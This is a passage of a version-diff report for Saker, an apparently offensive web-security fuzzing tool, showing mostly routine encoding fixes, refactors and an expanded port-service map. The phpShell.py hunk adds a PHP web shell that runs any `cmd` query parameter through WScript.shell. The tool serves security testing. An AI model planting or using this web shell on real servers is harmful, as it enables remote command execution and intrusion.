     def fuzz(cls):
         for p in cls.localpayloads:
             yield p
```

### Comparing `Saker-1.0.8/saker/fuzzers/ssti.py` & `Saker-1.0.9/saker/fuzzers/ssti.py`

 * *Files identical despite different names*

### Comparing `Saker-1.0.8/saker/fuzzers/url.py` & `Saker-1.0.9/saker/fuzzers/url.py`

 * *Files identical despite different names*

### Comparing `Saker-1.0.8/saker/fuzzers/xss.py` & `Saker-1.0.9/saker/fuzzers/xss.py`

 * *Files identical despite different names*

### Comparing `Saker-1.0.8/saker/fuzzers/xxe.py` & `Saker-1.0.9/saker/fuzzers/xxe.py`

 * *Files identical despite different names*

### Comparing `Saker-1.0.8/saker/handler/headerHandler.py` & `Saker-1.0.9/saker/handler/headerHandler.py`

 * *Files identical despite different names*

### Comparing `Saker-1.0.8/saker/handler/htmlHandler.py` & `Saker-1.0.9/saker/handler/htmlHandler.py`

 * *Files 6% similar despite different names*

```diff
@@ -23,18 +23,23 @@
         css = re.compile(r'<style.*?</style>')
         comment = re.compile(r'<!--[\s\S]*?-->')
         jscomment = re.compile(r'(\/\/.*)|(\/\*[\s\S]*?\*\/)')
         meta = re.compile(r'<meta.*?>')
 
     def __init__(self, content):
         super(HTMLHandler, self).__init__()
+        if isinstance(content, bytes):
+            content = self.chardecode(content)
         self.content = content
 
     def chardecode(self, string):
-        return string.decode(chardet.detect(string)['encoding'])
+        encoding = chardet.detect(string)['encoding']
+        if encoding is None:
+            return string.decode(errors="ignore")
+        return string.decode(encoding, errors="ignore")
 
     @property
     def title(self):
         title = self.RegExp.title.findall(self.content)
         return title[0] if len(title) else 'None'
 
     @property
```

### Comparing `Saker-1.0.8/saker/handler/wappalyzer.py` & `Saker-1.0.9/saker/handler/wappalyzer.py`

 * *Files 1% similar despite different names*

```diff
@@ -146,15 +146,15 @@
     def _get_implied_apps(self, detected_apps):
         """
         Get the set of apps implied by `detected_apps`.
         """
         def __get_implied_apps(apps):
             _implied_apps = set()
             for app in apps:
-                if 'implies' in self.apps[app]:
+                if 'implies' in self.apps.get(app, ""):
                     _implied_apps.update(set(self.apps[app]['implies']))
             return _implied_apps
 
         implied_apps = __get_implied_apps(detected_apps)
         all_implied_apps = set()
 
         # Descend recursively until we've found all implied apps
```

### Comparing `Saker-1.0.8/saker/payloads/misc/thinkphp5_rce.py` & `Saker-1.0.9/saker/payloads/misc/thinkphp5_rce.py`

 * *Files identical despite different names*

### Comparing `Saker-1.0.8/saker/payloads/misc.py` & `Saker-1.0.9/saker/payloads/misc.py`

 * *Files identical despite different names*

### Comparing `Saker-1.0.8/saker/payloads/phpShell.py` & `Saker-1.0.9/saker/payloads/phpShell.py`

 * *Files 6% similar despite different names*

```diff
@@ -144,7 +144,19 @@
 $o = unserialize($s);
 gc_collect_cycles();
 $f1 = "aaaa";
 $f2 = "bbbb";
 var_dump($o);
 """
         self.shell(code)
+
+    def win_system(self):
+        code = """
+$command=$_GET['cmd'];
+$wsh = new COM('WScript.shell');
+$exec = $wsh->exec("cmd /c ".$command);
+$stdout = $exec->StdOut();
+$stroutput = $stdout->ReadAll();
+// if needed
+$stroutput = iconv("GBK", "UTF-8", $stroutput); 
+echo $stroutput;"""
+        self.shell(code)
```

### Comparing `Saker-1.0.8/saker/payloads/xdebug.py` & `Saker-1.0.9/saker/payloads/xdebug.py`

 * *Files identical despite different names*

### Comparing `Saker-1.0.8/saker/port/ftp.py` & `Saker-1.0.9/saker/port/ftp.py`

 * *Files identical despite different names*

### Comparing `Saker-1.0.8/saker/port/jdwp.py` & `Saker-1.0.9/saker/port/jdwp.py`

 * *Files identical despite different names*

### Comparing `Saker-1.0.8/saker/port/memcached.py` & `Saker-1.0.9/saker/port/memcached.py`

 * *Files identical despite different names*

### Comparing `Saker-1.0.8/saker/port/nmap.py` & `Saker-1.0.9/saker/port/nmap.py`

 * *Files identical despite different names*

### Comparing `Saker-1.0.8/saker/port/probe.py` & `Saker-1.0.9/saker/port/probe.py`

 * *Files 18% similar despite different names*

```diff
@@ -4,20 +4,50 @@
 import socket
 import requests
 
 
 class Probe(object):
 
     knownPorts = {
-        21: "tcp",
+        21: "ftp",
         22: "ssh",
+        23: "telnet",
+        25: "smtp",
+        53: "dns",
+        67: "dhcp",
+        68: "dhcp",
+        69: "tftp",
         80: "http",
+        110: "pop3",
         111: "rpcbind",
+        135: "smb",
+        143: "imap",
+        161: "snmp",
+        389: "ldap",
         443: "https",
+        445: "smb",
+        873: "rsync",
+        993: "imap",
+        995: "pop3",
+        1090: "rmi",
+        1443: "mssql",
+        1521: "oracle",
         2049: "nfs",
+        2375: "docker",
+        3306: "mysql",
+        3389: "rdp",
+        5432: "postgres",
+        8080: "http",
+        6379: "redis",
+        6443: "kubernetes",
+        9200: "elasticsearch",
+        11211: "memcached",
+        15672: "rabbitmq",
+        27017: "mongodb",
+        50022: "nsfocus-ssh",
     }
 
     banners = {
         "ftp": ["vsFTPd"],
         "ActiveMQ": ["ActiveMQ"],
     }
 
@@ -35,15 +65,15 @@
         else:
             print("not http, continue")
         ret = self.http(addr, port)
         if ret is not None:
             return ret
         else:
             print("not https, continue")
-        self.normalTcp(addr, port)
+        return self.normalTcp(addr, port)
 
     def http(self, addr, port):
         url = "http://%s:%s" % (addr, port)
         try:
             r = requests.get(url, timeout=self.timeout)
             print(r.content)
             return True
@@ -75,12 +105,13 @@
         )
         cli.settimeout(self.timeout)
         cli.connect((addr, port))
         cli.send(b"AAA")
         try:
             recv = cli.recv(4096)
             print(recv)
+            return True
         except socket.timeout as e:
             return None
         except Exception as e:
             print(repr(e))
             return None
```

### Comparing `Saker-1.0.8/saker/port/redis.py` & `Saker-1.0.9/saker/port/redis.py`

 * *Files identical despite different names*

### Comparing `Saker-1.0.8/saker/port/ssh.py` & `Saker-1.0.9/saker/port/ssh.py`

 * *Files identical despite different names*

### Comparing `Saker-1.0.8/saker/port/telnet.py` & `Saker-1.0.9/saker/port/telnet.py`

 * *Files identical despite different names*

### Comparing `Saker-1.0.8/saker/servers/http/base.py` & `Saker-1.0.9/saker/servers/http/base.py`

 * *Files identical despite different names*

### Comparing `Saker-1.0.8/saker/servers/http/ssrf.py` & `Saker-1.0.9/saker/servers/http/ssrf.py`

 * *Files identical despite different names*

### Comparing `Saker-1.0.8/saker/servers/http/xss.py` & `Saker-1.0.9/saker/servers/http/xss.py`

 * *Files identical despite different names*

### Comparing `Saker-1.0.8/saker/servers/socket/dnsproxy.py` & `Saker-1.0.9/saker/servers/socket/dnsproxy.py`

 * *Files identical despite different names*

### Comparing `Saker-1.0.8/saker/servers/socket/dnsrebinding.py` & `Saker-1.0.9/saker/servers/socket/dnsrebinding.py`

 * *Files identical despite different names*

### Comparing `Saker-1.0.8/saker/utils/configcheck.py` & `Saker-1.0.9/saker/utils/configcheck.py`

 * *Files identical despite different names*

### Comparing `Saker-1.0.8/saker/utils/daemon.py` & `Saker-1.0.9/saker/utils/daemon.py`

 * *Files identical despite different names*

### Comparing `Saker-1.0.8/saker/utils/datatype.py` & `Saker-1.0.9/saker/utils/datatype.py`

 * *Files identical despite different names*

### Comparing `Saker-1.0.8/saker/utils/domain.py` & `Saker-1.0.9/saker/utils/domain.py`

 * *Files 7% similar despite different names*

```diff
@@ -16,14 +16,22 @@
     bracket = re.compile(r"(.*?)\.(\d+)[\[\{\(](.*)[\)\}\]]$")  # parses '1.2.3.4[5-9]' or '1.2.3.[57]'
     crange = re.compile(r"(.*?)\.(\d+)\-(\d+)$")
     brange = re.compile(r"(.*?)\.(\d+)\-(\d+).(\d+)$")
     hostname = re.compile(r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+[A-Z]{2,6}\.?)', re.IGNORECASE)
 
 
 def cidrize(ipstr):
+    """
+    将各种格式的IP字符串扩展为IP列表
+
+    1.1.1.1,1.1.1.2
+    1.1.1.1-124
+    1.1.1.1/24
+    1.2.3.4[5-9]
+    """
     ipstr = ipstr.replace(' ', '').strip()
 
     if isIPv4(ipstr):
         return [ipstr]
 
     ips = []
     if ',' in ipstr:
@@ -44,15 +52,15 @@
         finish = ".".join(start.split(".")[:-1] + [finish])
         return [str(i) for i in IPRange(start, finish)]
 
     if RES.brange.match(ipstr):
         # b段
         parts = ipstr.split('.')
         temp = parts[2].split("-")
-        for i in range(int(temp[0]), int(temp[1])+1):
+        for i in range(int(temp[0]), int(temp[1]) + 1):
             parts[2] = str(i)
             ips.append(".".join(parts))
         return ips
 
     if RES.bracket.match(ipstr):
         match = RES.bracket.match(ipstr)
         parts = match.groups()
@@ -131,26 +139,14 @@
 
 def gethostip():
     myname = socket.getfqdn(socket.gethostname())
     myaddr = socket.gethostbyname(myname)
     return myaddr
 
 
-def isInternalIp(ip):
-
-    # https://en.wikipedia.org/wiki/Private_network
-
-    priv_lo = re.compile("^127\.\d{1,3}\.\d{1,3}\.\d{1,3}$")
-    priv_24 = re.compile("^10\.\d{1,3}\.\d{1,3}\.\d{1,3}$")
-    priv_20 = re.compile("^192\.168\.\d{1,3}.\d{1,3}$")
-    priv_16 = re.compile("^172.(1[6-9]|2[0-9]|3[0-1]).[0-9]{1,3}.[0-9]{1,3}$")
-
-    return priv_lo.match(ip) or priv_24.match(ip)\
-        or priv_20.match(ip) or priv_16.match(ip) \
-        or ip == "localhost"
 
 
 def isInternal(seed, stype):
 
     if stype == "IP":
         return isInternalIp(seed)
 
@@ -158,9 +154,14 @@
         ips = domain2ips(seed)
         for ip in ips:
             if isInternalIp(ip):
                 return True
 
     if stype == "NETBLOCK":
         return isInternalIp(seed.split("/")[0])
-
     return False
+
+
+def get_domain(domain):
+    import tldextract
+    r = tldextract.extract(domain)
+    return "%s.%s" % (r.domain, r.suffix)
```

### Comparing `Saker-1.0.8/saker/utils/encode.py` & `Saker-1.0.9/saker/utils/encode.py`

 * *Files identical despite different names*

### Comparing `Saker-1.0.8/saker/utils/fakeid.py` & `Saker-1.0.9/saker/utils/fakeid.py`

 * *Files identical despite different names*

### Comparing `Saker-1.0.8/saker/utils/flaskencoder.py` & `Saker-1.0.9/saker/utils/flaskencoder.py`

 * *Files 0% similar despite different names*

```diff
@@ -1,8 +1,7 @@
-
 import zlib
 import json
 
 from itsdangerous import base64_decode, base64_encode
 
 from flask import Flask
 from flask.sessions import SecureCookieSessionInterface
```

### Comparing `Saker-1.0.8/saker/utils/httpparser.py` & `Saker-1.0.9/saker/utils/httpparser.py`

 * *Files identical despite different names*

### Comparing `Saker-1.0.8/saker/utils/logger.py` & `Saker-1.0.9/saker/utils/logger.py`

 * *Files 2% similar despite different names*

```diff
@@ -63,11 +63,11 @@
         logpath = os.path.join(logdir, "saker-" + today() + ".log")
         if not os.path.exists(logdir):
             os.mkdir(logdir)
 
     formatStr = '[%(asctime)s] [%(levelname)s] %(message)s'
     formatter = logging.Formatter(formatStr)
 
-    fh = logging.FileHandler(logpath)
+    fh = logging.FileHandler(logpath, encoding="utf-8")
     fh.setLevel(loggerLevel)
     fh.setFormatter(formatter)
     return fh
```

### Comparing `Saker-1.0.8/saker/utils/mtime.py` & `Saker-1.0.9/saker/utils/mtime.py`

 * *Files identical despite different names*

### Comparing `Saker-1.0.8/saker/utils/paths.py` & `Saker-1.0.9/saker/utils/paths.py`

 * *Files identical despite different names*

### Comparing `Saker-1.0.8/saker/utils/serializer.py` & `Saker-1.0.9/saker/utils/serializer.py`

 * *Files 14% similar despite different names*

```diff
@@ -11,42 +11,47 @@
     def __init__(self, serializer="json", savepath="."):
         super(Serializer, self).__init__()
         if serializer == "json":
             self.suffix = "json"
             self.serializer = json
             self.saveMode = "w"
             self.readMode = "r"
+            self.encoding = "utf-8"
         elif serializer == "pickle":
             self.suffix = "pkl"
             self.saveMode = "wb"
             self.readMode = "rb"
             self.serializer = pickle
+            self.encoding = None
         self.dir = os.path.abspath(savepath)
         if not os.path.exists(self.dir):
             os.mkdir(self.dir)
 
     def getPath(self, identifier):
         return os.path.join(self.dir, identifier + "." + self.suffix)
 
     def save(self, val, identifier):
         """
         save variable into file
         :param val: the val you want to save
         :param identifier: str. the identifier of variable
         :return: bool. status of save
         """
-        with open(self.getPath(identifier), self.saveMode) as fh:
-            self.serializer.dump(val, fh)
+        with open(self.getPath(identifier), self.saveMode, encoding=self.encoding) as fh:
+            if self.suffix == "json":
+                self.serializer.dump(val, fh, ensure_ascii=False)
+            else:
+                self.serializer.dump(val, fh)
         return True
 
     def load(self, identifier):
         """
         load variable from file
         :param identifier: str. the identifier of variable
         :return: variable
         """
-        with open(self.getPath(identifier), self.readMode) as fh:
+        with open(self.getPath(identifier), self.readMode, encoding=self.encoding) as fh:
             data = self.serializer.load(fh)
         return data
 
     def remove(self, identifier):
         os.unlink(self.getPath(identifier))
```

### Comparing `Saker-1.0.8/saker/utils/show.py` & `Saker-1.0.9/saker/utils/show.py`

 * *Files identical despite different names*

### Comparing `Saker-1.0.8/saker/utils/url.py` & `Saker-1.0.9/saker/utils/url.py`

 * *Files identical despite different names*

### Comparing `Saker-1.0.8/setup.py` & `Saker-1.0.9/setup.py`

 * *Files 1% similar despite different names*

```diff
@@ -19,15 +19,15 @@
     'six>=1.11.0',
     'termcolor>=1.1.0',
     'urllib3>=1.22',
 ]
 
 setup(
     name="Saker",
-    version="1.0.8",
+    version="1.0.9",
     keywords=("Web Security", "Fuzz"),
     description="Tool For Fuzz Web Applications",
     long_description=long_description,
     long_description_content_type="text/markdown",
     license="GPLv3 Licence",
     url="https://github.com/LyleMi/Saker",
     author="Lyle",
```

